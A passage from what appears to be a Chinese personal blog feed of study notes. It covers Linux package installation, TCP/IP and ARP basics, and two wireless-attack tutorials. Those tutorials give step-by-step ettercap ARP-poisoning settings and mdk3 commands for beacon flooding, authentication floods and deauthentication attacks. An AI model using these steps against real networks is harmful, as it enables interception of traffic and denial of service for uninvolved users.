number+1相等，并且ack&#x3D;1，确认正确，则建立连接，进入Established状态，为第三次握手。<br>4.5、建立TCP连接后，会使用HTTP协议发送HTTP的GET请求，服务器处理请求返回资源数据。</p><p>5)<strong>浏览器处理数据</strong></p><p>5.1、再接收到所请求的资源之后，浏览器会对接收到的html、css、js等数据根据标准格式进行解析。<br>5.2、然后会通过构建和遍历DOM节点树，进行各个节点的渲染计算，最后进行GPU的渲染布局和绘制步骤等。</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
      <tag>协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下软件的安装</title>
    <link href="/blog/2018/09/23/Linux%E4%B8%8B%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <url>/blog/2018/09/23/Linux%E4%B8%8B%E8%BD%AF%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p><strong>今天突然想给自己的虚拟机装点软件，可是发现自己以前只会装tar.gz的安装包，今天记一下其他的安装方法。</strong></p><p><img src="/images/fj13.jpg"></p><span id="more"></span><h1 id="一、-解析Linux应用软件安装包："><a href="#一、-解析Linux应用软件安装包：" class="headerlink" title="一、 解析Linux应用软件安装包："></a>一、 解析Linux应用软件安装包：</h1><p>通常Linux应用软件的安装包有三种：<br>　　1. tar包，如software-1.2.3-1.tar.gz。它是使用UNIX系统的打包工具tar打包的。<br>　　2. rpm包，如software-1.2.3-1.i386.rpm。它是Redhat Linux提供的一种包封装格式。<br>　　3. dpkg包，如software-1.2.3-1.deb。它是Debain Linux提供的一种包封装格式。</p><p>而且，大多数Linux应用软件包的命名也有一定的规律，它遵循：<br>名称-版本-修正版-类型<br>例如：　　</p><ol><li>software-1.2.3-1.tar.gz 意味着：<br>　　　软件名称：software<br>　　　版本号：1.2.3<br>　　　修正版本：1<br>　　　类型：tar.gz，说明是一个tar包。</li><li>sfotware-1.2.3-1.i386.rpm<br>　　　软件名称：software<br>　　　版本号：1.2.3<br>　　　修正版本：1<br>　　　可用平台：i386，适用于Intel 80x86平台。<br>　　　类型：rpm，说明是一个rpm包。<br>　　　注：由于rpm格式的通常是已编译的程序，所以需指明平台。在后面会详细说明。</li></ol><h1 id="二、-了解包里的内容："><a href="#二、-了解包里的内容：" class="headerlink" title="二、 了解包里的内容："></a>二、 了解包里的内容：</h1><p>一个Linux应用程序的软件包中可以包含两种不同的内容：</p><p>　1. 一种就是可执行文件，也就是解开包后就可以直接运行的。在Windows中所 有的软件包都是这种类型。安装完这个程序后，你就可以使用，但你看不到源程序。而且下载时要注意这个软件是否是你所使用的平台，否则将无法正常安装。</p><p>　2. 另一种则是源程序，也就解开包后，你还需要使用编译器将其编译成为可执行文件。这在Windows系统中是几乎没有的，因为Windows的思想是不开放源程序的。<br>　通常，用tar打包的，都是源程序；而用rpm、dpkg打包的则常是可执行程序。一般来说，自己动手编译源程序能够更具灵活性，但也容易遇到各 种问题和困难。而相对来说，下载那些可执行程序包，反而是更容易完成软件的安装，当然那样灵活性就差多了。所以一般一个软件总会提供多种打包格式的安装程 序的。你可以根据自己的情况来选择。</p><h1 id="三、-搞定使用tar打包的应用软件"><a href="#三、-搞定使用tar打包的应用软件" class="headerlink" title="三、 搞定使用tar打包的应用软件"></a>三、 搞定使用tar打包的应用软件</h1><ol><li>安装：<br>整个安装过程可以分为以下几步：</li></ol><p>　- 取得应用软件：通过下载、购买光盘的方法获得；<br>　- 解压缩文件：一般tar包，都会再做一次压缩，如gzip、bz2等，所以你需要先解压。如果是最常见的gz格式，则可以执行：“tar –xvzf 软件包名”，就可以一步完成解压与解包工作。如果不是，则先用解压软件，再执行“tar –xvf 解压后的tar包”进行解包；<br>　- 阅读附带的INSTALL文件、README文件；<br>　- 执行“.&#x2F;configure”命令为编译做好准备；<br>　- 执行“make”命令进行软件编译；<br>　- 执行“make install”完成安装；<br>　- 执行“make clean”删除安装时产生的临时文件。<br>好了，到此大功告成。我们就可以运行应用程序了。但这时，有的读者就会问，我怎么执行呢？这也是一个Linux特色的问题。其实，一般来说， Linux的应用软件的可执行文件会存放在&#x2F;usr&#x2F;local&#x2F;bin目录下！不过这并不是“放四海皆准”的真理，最可靠的还是看这个软件的 INSTALL和README文件，一般都会有说明。</p><ol start="2"><li>卸载：<br>　通常软件的开发者很少考虑到如何卸载自己的软件，而tar又仅是完成打包的工作，所以并没有提供良好的卸载方法。<br>  那么是不是说就不能够卸载呢！其实也不是，有两个软件能够解决这个问题，那就是Kinstall和Kife，它们是tar包安装、卸载的黄金搭档。</li></ol><h1 id="四、-搞定使用rpm打包的应用软件"><a href="#四、-搞定使用rpm打包的应用软件" class="headerlink" title="四、 搞定使用rpm打包的应用软件"></a>四、 搞定使用rpm打包的应用软件</h1><p>rpm可谓是Redhat公司的一大贡献，它使Linux的软件安装工作变得更加简单容易。</p><ol><li>安装：<br>我只需简单的一句话，就可以说完。执行：<br> <code>rpm –ivh rpm软件包名</code><br>更高级的，请见下表：<br>　　  rpm参数 参数说明<br>　　   -i    安装软件<br>　　   -t     测试安装，不是真的安装<br>　　   -p   显示安装进度<br>　　   -f     忽略任何错误<br>　　   -U   升级安装<br>　　   -v    检测套件是否正确安装<br>这些参数可以同时采用。更多的内容可以参考RPM的命令帮助。</li><li>卸载：<br>我同样只需简单的一句话，就可以说完。执行：<br>　<code> rpm –e 软件名</code><br>不过要注意的是，后面使用的是软件名，而不是软件包名。例如，要安装software-1.2.3-1.i386.rpm这个包时，应执行：<br> <code>rpm –ivh software-1.2.3-1.i386.rpm</code><br>而当卸载时，则应执行： rpm –e software。</li></ol><p>　　<br>另外，在Linux中还提供了象GnoRPM、kpackage等图形化的RPM工具，使得整个过程会更加简单。这些软件的具体应用，笔者会另行文介绍。</p><h1 id="五、-搞定使用deb打包的应用程序"><a href="#五、-搞定使用deb打包的应用程序" class="headerlink" title="五、 搞定使用deb打包的应用程序"></a>五、 搞定使用deb打包的应用程序</h1><p>这是Debian Linux提供的一个包管理器，它与RPM十分类似。但由于RPM出现得更早，所以在各种版本的Linux都常见到。而debian的包管理器dpkg则 只出现在Debina Linux中，其它Linux版本一般都没有。我们在此就简单地说明一下：</p><ol><li>安装<br>　   <code>dpkg –i deb软件包名</code><br>　　如：<code>dpkg –i software-1.2.3-1.deb</code></li><li>卸载<br>　　 <code>dpkg –e 软件名</code><br>　　如：<code>dpkg –e software</code></li></ol><h1 id="六、软件的安装"><a href="#六、软件的安装" class="headerlink" title="六、软件的安装"></a>六、软件的安装</h1><p>　　—- Linux下软件的安装主要有两种不同的形式。第一种安装文件名为filename.tar.gz。另一种安装文件名为 filename.i386.rpm。以第一种方式发行的软件多为以源码形式发送的。第二种方式则是直接以二进制形式发行的。i386即表示该软件是按 Inter 386指令集编译生成的。<br>　　—- 对于第一种，安装方法如下：<br>　　—- 首先，将安装文件拷贝至你的目录中。例如，如果你是以root身份登录上的，就将软件拷贝至&#x2F;root中。<br>　　—- #cp filename.tar.gz &#x2F;root<br>　　—- 由于该文件是被压缩并打包的，所以，应对其解压缩。命令为：<br>　　—- #tar xvzf filename.tar.gz<br>　　—- 执行该命令后，安装文件按路径，解压缩在当前目录下。用ls命令可以看到解压缩后的文件。通常在解压缩后产生的文件中，有名为”INSTALL”的文件。该文件为纯文本文件，详细讲述了该软件包的安装方法。<br>　　—- 对于多数需要编译的软件，其安装的方法大体相同。执行解压缩后产生的一个名为configure的可执行脚本程序。它是用于检查系统是否有编译时所需的库，以及库的版本是否满足编译的需要等安装所需要的系统信息。为随后的编译工作做准备。命令为：<br>　　—- #.&#x2F;configure<br>　　—- 如果检查过程中，发现有错误，configure将给予提示，并停止检查。你可以跟据提示对系统进行配置。再重新执行该程序。检查通过后，将生成用于编译 的MakeFile文件。此时，可以开始进行编译了。编译的过程视软件的规模和计算机的性能的不同，所耗费的时间也不同。命令为：<br>　　—- #make<br>　　—- 成功编译后，键入如下的命令开始安装：<br>　　—- #make install<br>　　—- 安装完毕，应清除编译过程中产生的临时文件和配置过程中产生的文件。键入如下命令：<br>　　<code>#make clean </code><br>　　<code>#make distclean</code><br>　　至此，软件的安装结束。<br>　　—- 对于第二种，其安装方法要简单的多。<br>　　—- 同第一种方式一样，将安装文件拷贝至你的目录中。然后使用rpm来安装该文件。命令如下：<br>　　—- #rpm -i filename.i386.rpm<br>　　—- rpm将自动将安装文件解包，并将软件安装到缺省的目录下。并将软件的安装信息注册到rpm的数据库中。参数i的作用是使rpm进入安装模式。<br>　　—- 另外，还有一些Linux平台下的商业软件。在其安装文件中，有Setup安装程序，其安装方法同Windows平台下的一样。如:Corel WordPerfect。<br>　　软件的卸载<br>　　—- 软件的卸载主要是使用rpm来进行的。卸载软件首先要知道软件包在系统中注册的名称。键入命令：<br>　　—- #rpm -q -a<br>　　—- 即可查询到当前系统中安装的所有的软件包。参数q的作用是使rpm进入查询命令模式。参数a是查询模式的子参数，意为全部（ALL）。查询到的信息较多，可使用less人屏显示。<br>　　—- 确定了要卸载的软件的名称，就可以开始实际卸载该软件了。键入命令：<br>　　—- #rpm -e [package name]<br>　　—- 即可卸载软件。参数e的作用是使rpm进入卸载模式。对名为[package name]的软件包进行卸载。由于系统中各个软件包之间相互有依赖关系。如果因存在依赖关系而不能卸载，rpm将给予提示并停止卸载。你可以使用如下的命 令来忽略依赖关系，直接开始卸载：<br>　　—- #rpm -e [package name] -nodeps<br>　　—- 忽略依赖关系的卸载可能会导致系统中其它的一此软件无法使用。你可以使用<br>　　—- #rpm -e [package name] -test<br>　　—- 使rpm进行一次卸载预演，而不是真正卸载。这样可以使你检查一下软件是否存在有依赖关系。卸载过程中是否有错误。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux基础知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无线监听</title>
    <link href="/blog/2018/09/09/%E6%97%A0%E7%BA%BF%E7%9B%91%E5%90%AC/"/>
    <url>/blog/2018/09/09/%E6%97%A0%E7%BA%BF%E7%9B%91%E5%90%AC/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下ARP欺骗的概念，学习使用ettercap工具进行，学习使用driftnet、sslstrip等工具监听消息。</strong></p><p><img src="/images/fj12.jpg"></p><span id="more"></span><h1 id="ARP欺骗与消息监听概述"><a href="#ARP欺骗与消息监听概述" class="headerlink" title="ARP欺骗与消息监听概述"></a>ARP欺骗与消息监听概述</h1><h2 id="什么是ARP（地址解析协议）"><a href="#什么是ARP（地址解析协议）" class="headerlink" title="什么是ARP（地址解析协议）"></a>什么是ARP（地址解析协议）</h2><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。相关协议有RARP、代理ARP。NDP用于在IPv6中代替地址解析协议。</p><p>在无线网络环境中，ARP欺骗的对象是受攻击的设备以及无线网关。攻击者首先需要接入目标所在的无线网络，随后向受攻击设备冒充自己是无线网关，同时向无线网关冒充自己是发起请求的用户，开启攻击机上的IP转发功能，使自己成为整个通信过程中的中转站，从而能够监听到所有的通信数据，能够进一步篡改数据。</p><h1 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h1><h2 id="1-使用ettercap工具进行ARP欺骗（无需开启监听模式）"><a href="#1-使用ettercap工具进行ARP欺骗（无需开启监听模式）" class="headerlink" title="1.使用ettercap工具进行ARP欺骗（无需开启监听模式）"></a>1.使用ettercap工具进行ARP欺骗（无需开启监听模式）</h2><ol><li>开启本机的ip转发功能。<br>输入命令：<br><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></li><li>修改ettercap的配置文件<br>输入命令：<br><code>leafpad /etc/ettercap/etter.conf</code><br>修改：<br>[privs]<br>ec_uid &#x3D; 0                # nobody is the default<br>ec_gid &#x3D; 0                # nobody is the default<br>找到iptables，将其注释删除。</li><li>打开ettercap，选择菜单项Sniff-&gt;Unified sniffing,扫描当前网络中的设备，在弹出的窗口中选择接口，选择wlan0（无线网卡对应接口），单击OK。</li><li>选择Hosts-&gt;Hosts list,进入终端列表。再选择Hosts-&gt;Scan for hosts,扫描当前网络中的设备。</li><li>选择目标设备IP，单击Add to Target 1按钮，选择 网关的IP，单击Add to Target 2。</li><li>单击菜单Mitm-&gt;ARP Poisoning,在弹出的对话框中选择Sniff remote connections。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>无线渗透</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无线DoS攻击</title>
    <link href="/blog/2018/09/08/%E6%97%A0%E7%BA%BFDoS%E6%94%BB%E5%87%BB/"/>
    <url>/blog/2018/09/08/%E6%97%A0%E7%BA%BFDoS%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下一种常见的无线攻击方式——无线DoS攻击。使用的工具是mdk3。</strong></p><p><img src="/images/fj11.jpg"></p><span id="more"></span><h1 id="MDK介绍"><a href="#MDK介绍" class="headerlink" title="MDK介绍"></a>MDK介绍</h1><p>MDK 是利用IEEE 802.11 协议中的漏洞开发的攻击工具。本次将主要利用MDK 3 工具进行三种攻击，MDK3详细使用指南可以百度一下。</p><h2 id="MDK3的三种攻击模式"><a href="#MDK3的三种攻击模式" class="headerlink" title="MDK3的三种攻击模式"></a>MDK3的三种攻击模式</h2><h3 id="1-Beacon-Flood模式"><a href="#1-Beacon-Flood模式" class="headerlink" title="1.Beacon Flood模式"></a>1.Beacon Flood模式</h3><p>AP发出每秒钟约10个信标帧使客户端能够探测到这些AP的存在。当客户端扫描无线网络时，实际是在每个信道扫描寻找信标帧。通过使用MDK3工具的Beacon Flood模式，也能够发送这些信标帧，但是这些网络都是假的，没有人能够真正连接到它们。但是当用户打开无线网络进行扫描时，这些无线网络都会出现在设备的列表中。此外，这种模式也可以通过伪造大量具有相同SSID的假冒网络来隐藏目标网络。</p><h3 id="2-Authentication（身份验证）-DOS模式"><a href="#2-Authentication（身份验证）-DOS模式" class="headerlink" title="2.Authentication（身份验证） DOS模式"></a>2.Authentication（身份验证） DOS模式</h3><p>当一个客户端接入一个AP，需要满足几个步骤，其中两个基本步骤就是认证和关联。第一步会询问AP是否能接入一个新的设备，AP收到请求后会决定新的客户端是否被接受。如果一个未知的客户端会尝试连接，mac过滤器可能会拒绝这一请求。第二步是密钥验证阶段，大多数AP采用开放的模式，因此关联步骤总是会通过，真正验证密钥有效性的阶段将在后面进行（例如WPA中的EAP阶段）。这么做的缺点在于攻击者可以发起多个连接请求后放弃这些请求，但是AP会在内存中保留这些请求。此攻击模式会向AP发送尽可能多的连接请求，同时跟踪AP的响应，甚至会发送网络中截获的其他有效数据包，来混淆AP对于真假客户端的判断，可能会造成AP丢弃合法用户的连接请求。</p><h3 id="3-Deauthentication-x2F-Disassociation-Amok-模式"><a href="#3-Deauthentication-x2F-Disassociation-Amok-模式" class="headerlink" title="3.Deauthentication&#x2F;Disassociation Amok 模式"></a>3.Deauthentication&#x2F;Disassociation Amok 模式</h3><p>如果一个客户端需要断开无线网络，他需要向AP发送Deauthentication包注销自己。同时AP也可以主动断开与客户端的连接，例如AP的连接列表已满，新的连接将旧的连接踢出。攻击者可以伪造包使合法用户断开连接。MDK3可以伪造多种包，来应对如下情况：</p><ul><li>AP主动取消客户端认证</li><li>客户端主动取消与AP的认证</li><li>AP主动与客户端取消关联</li><li>客户端主动与AP取消关联</li></ul><h1 id="使用Kali-Linux进行三种攻击实战"><a href="#使用Kali-Linux进行三种攻击实战" class="headerlink" title="使用Kali Linux进行三种攻击实战"></a>使用Kali Linux进行三种攻击实战</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先你需要一块无线网卡，kali虚拟机（为了方便直接使用，里面的小工具很多，不用再去自己下载了）</p><h3 id="1-查看你的网卡信息"><a href="#1-查看你的网卡信息" class="headerlink" title="1.查看你的网卡信息"></a>1.查看你的网卡信息</h3><p>在kali Linux下使用命令查看网卡信息。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>效果图如下：<br><img src="/images/aircrack-ng.png"></p><p>可以看到里面有个wlan0，那就是我的网卡，如果没有的话就把无线网卡拔了再插一下，直到找到那个wlan0为止。一定要保证它<strong>现在没有连接到任何wifi</strong>，上面那个wlan0里面<strong>没有ip地址</strong>什么的就说明现在不在连接中。</p><h3 id="2-激活无线网卡至monitor即监听模式"><a href="#2-激活无线网卡至monitor即监听模式" class="headerlink" title="2.激活无线网卡至monitor即监听模式"></a>2.激活无线网卡至monitor即监听模式</h3><p>使用命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">airmon-ng <span class="hljs-literal">start</span> wlan0<br></code></pre></td></tr></table></figure><p>然后会出现以下提示信息：<br><img src="/images/aircrack-ng1.png"></p><p>如果再次使用ifconfig可以发现，我们的网卡已经被重命名为wlan0mon</p><p><strong>获取当前网络概况：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">airodump-ng wlan0mon<br></code></pre></td></tr></table></figure><p>其中wlan0mon是已经激活监听状态的网卡。</p><h2 id="进行Beacon-Flood攻击"><a href="#进行Beacon-Flood攻击" class="headerlink" title="进行Beacon Flood攻击"></a>进行Beacon Flood攻击</h2><p>这个模式可以产生很多死亡SSID充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID以及加密方式等。</p><p>参数说明：</p><ul><li>-f：读取SSID列表文件，默认生成随机SSID；</li><li>-c：信道，默认随机信道；</li><li>-s：发包率，默认50。</li></ul><p>新建字典文件SSID.txt ,字典文件中存的每一个条目为伪造SSID的名称。此步可以忽略，如果忽略，MDK3将生成随机字符串作为SSID。同理，mac地址也可以指定。</p><p>输入命令：<br><code>mdk3 wlan0mon b -f[文件路径] -s[速率]</code></p><p>创建如下文件：<br><img src="/images/ssidtxt.png"></p><p>结果如下：</p><p><img src="/images/mdk3-1-1.png"></p><p><img src="/images/mdk3-1-2.png"></p><h2 id="进行Authentication（身份验证）-DOS攻击"><a href="#进行Authentication（身份验证）-DOS攻击" class="headerlink" title="进行Authentication（身份验证） DOS攻击"></a>进行Authentication（身份验证） DOS攻击</h2><p>这是一种验证请求攻击模式，在这个模式里，MDK3工具自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接的客户端的响应。由于目前绝大部分的的路由器都有应对这种DoS的防御措施，攻击效果并不明显。</p><p>参数说明：</p><ul><li>-a：测试指定的BSSID；</li><li>-m：使用有效的mac地址进行攻击；</li><li>-c：不检查是否测试成功；</li><li>-s:速率，默认50.</li></ul><p>输入命令：<br><code>mdk3 wlan0mon a -a [BSSID] -m</code></p><p><img src="/images/mdk3-2-1.png"><br>显然攻击是失败的！</p><h2 id="进行Deauthentication-x2F-Disassociation-Amok攻击"><a href="#进行Deauthentication-x2F-Disassociation-Amok攻击" class="headerlink" title="进行Deauthentication&#x2F;Disassociation Amok攻击"></a>进行Deauthentication&#x2F;Disassociation Amok攻击</h2><p>这是强制解除验证、解除连接的攻击。在这个模式下，MDK3工具会向周围所有可见AP发起循环攻击，可能造成一定范围内的无线网络瘫痪，直到手动停止攻击。</p><p>参数说明：</p><ul><li>-w：白名单，白名单中的mac不会被攻击；</li><li>-b：黑名单，工具会对黑名单中的mac进行攻击；</li><li>-s：发包速率；</li><li>-c：攻击信道，可以攻击多个信道，逗号分隔。</li></ul><p>为了避免大范围攻击，建议使用黑名单模式进行攻击。新建mac.txt文件，将目标mac地址写入其中。</p><p>输入命令：<br><code>mdk3 wlan0mon d -b [文件路径]</code></p><p><img src="/images/mdk3-3-1.png"></p><div style="position:absolute; bottom:0px; left:610px; width:76%;"><br>  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=25706282&auto=1&height=66"></iframe>  <br></div>]]></content>
    
    
    
    <tags>
      
      <tag>工具使用</tag>
      
      <tag>无线渗透</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络基本知识</title>
    <link href="/blog/2018/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
    <url>/blog/2018/09/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p><strong>今天了解一下计算机网络的基础知识，为以后深入学习计算机网络做准备。</strong></p><p><img src="/images/fj10.jpg"></p><span id="more"></span><h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><h2 id="OSI分层（7层）"><a href="#OSI分层（7层）" class="headerlink" title="OSI分层（7层）"></a>OSI分层（7层）</h2><ol><li>物理层</li><li>数据链路层</li><li>网络层</li><li>运输层</li><li>会话层</li><li>表示层</li><li>应用层</li></ol><h2 id="TCP-x2F-IP分层（4层）"><a href="#TCP-x2F-IP分层（4层）" class="headerlink" title="TCP&#x2F;IP分层（4层）"></a>TCP&#x2F;IP分层（4层）</h2><ol><li>网络接口层</li><li>网络层</li><li>运输层</li><li>应用层</li></ol><h2 id="五层协议（5层）"><a href="#五层协议（5层）" class="headerlink" title="五层协议（5层）"></a>五层协议（5层）</h2><ol><li>物理层</li><li>数据链路层</li><li>网络层</li><li>运输层</li><li>应用层</li></ol><h2 id="五层协议概述"><a href="#五层协议概述" class="headerlink" title="五层协议概述"></a>五层协议概述</h2><ol><li>应用层：通过应用进程间的交互来完成特定网络应用</li></ol><ul><li>数据：报文</li><li>协议：HTTP, SMTP(邮件), FTP(文件传送)</li></ul><ol start="2"><li>运输层：向两个主机进程之间的通信提供通用的数据传输服务。</li></ol><ul><li>数据：TCP:报文段，UDP:用户数据报</li><li>协议：TCP, UDP</li></ul><ol start="3"><li>网络层：为分组交换网上的不同主机提供通信服务</li></ol><ul><li>数据：包或IP数据报</li><li>协议：IP</li></ul><ol start="4"><li>数据链路层：</li></ol><ul><li>数据：帧</li></ul><ol start="5"><li>物理层：</li></ol><ul><li>数据：比特</li></ul><h2 id="ARP-x2F-RARP协议"><a href="#ARP-x2F-RARP协议" class="headerlink" title="ARP&#x2F;RARP协议"></a>ARP&#x2F;RARP协议</h2><p><strong>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个协议。</strong>主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。</p><p>　　ARP工作流程举例：<br>　　主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01；<br>　　主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02；</p><p>当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程：</p><ol><li>根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。</li><li>如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。</li><li>主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。</li><li>主机B将包含其MAC地址的ARP回复消息直接发送回主机A。</li><li>当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</li></ol><p><strong>逆地址解析协议，即RARP，功能和ARP协议相对，其将局域网中某个主机的物理地址转换为IP地址</strong>，比如局域网中有一台主机只知道物理地址而不知道IP地址，那么可以通过RARP协议发出征求自身IP地址的广播请求，然后由RARP服务器负责回答。<br>　　RARP协议工作流程：</p><ol><li>给主机发送一个本地的RARP广播，在此广播包中，声明自己的MAC地址并且请求任何收到此请求的RARP服务器分配一个IP地址；</li><li>本地网段上的RARP服务器收到此请求后，检查其RARP列表，查找该MAC地址对应的IP地址；</li><li>如果存在，RARP服务器就给源主机发送一个响应数据包并将此IP地址提供给对方主机使用；</li><li>如果不存在，RARP服务器对此不做任何的响应；</li><li>源主机收到从RARP服务器的响应信息，就利用得到的IP地址进行通讯；如果一直没有收到RARP服务器的响应信息，表示初始化失败。</li></ol><h2 id="TCP-x2F-IP协议"><a href="#TCP-x2F-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h2><p>TCP&#x2F;IP协议是Internet最基本的协议、Internet国际互联网络的基础，由网络层的IP协议和传输层的TCP协议组成。通俗而言：<strong>TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地。而IP是给因特网的每一台联网设备规定一个地址。</strong></p><p>IP层接收由更低层（网络接口层例如以太网设备驱动程序）发来的数据包，并把该数据包发送到更高层—TCP或UDP层；相反，IP层也把从TCP或UDP层接收来的数据包传送到更低层。IP数据包是不可靠的，因为IP并没有做任何事情来确认数据包是否按顺序发送的或者有没有被破坏，IP数据包中含有发送它的主机的地址（源地址）和接收它的主机的地址（目的地址）。</p><p>TCP是面向连接的通信协议，通过三次握手建立连接，通讯完成时要拆除连接，由于TCP是面向连接的所以只能用于端到端的通讯。TCP提供的是一种可靠的数据流服务，采用“带重传的肯定确认”技术来实现传输的可靠性。TCP还采用一种称为“滑动窗口”的方式进行流量控制，所谓窗口实际表示接收能力，用以限制发送方的发送速度。</p><p><strong>TCP报文首部格式：</strong></p><p><img src="/images/tcp%E9%A6%96%E9%83%A8.png"></p><p><strong>TCP的三次握手和四次挥手：</strong></p><p><img src="/images/tcp%E6%8F%A1%E6%89%8B%E5%92%8C%E6%8C%A5%E6%89%8B.jpg"></p><p>注：seq:”sequance”序列号；ack:”acknowledge”确认号；SYN:”synchronize”请求同步标志；；ACK:”acknowledge”确认标志”；FIN：”Finally”结束标志。</p><p><strong>三次握手：</strong></p><ol><li>第一次握手：建立连接。客户端发送连接请求报文段，将SYN位置为1，Sequence Number为x；然后，客户端进入SYN_SEND状态，等待服务器的确认；</li><li>第二次握手：服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为x+1(Sequence Number+1)；同时，自己自己还要发送SYN请求信息，将SYN位置为1，Sequence Number为y；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RECV状态；</li><li>第三次握手：客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为y+1，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</li></ol><p><strong>四次挥手：</strong></p><ol><li>第一次挥手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段；此时，主机1进入FIN_WAIT_1状态；这表示主机1没有数据要发送给主机2了；</li><li>第二次挥手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence 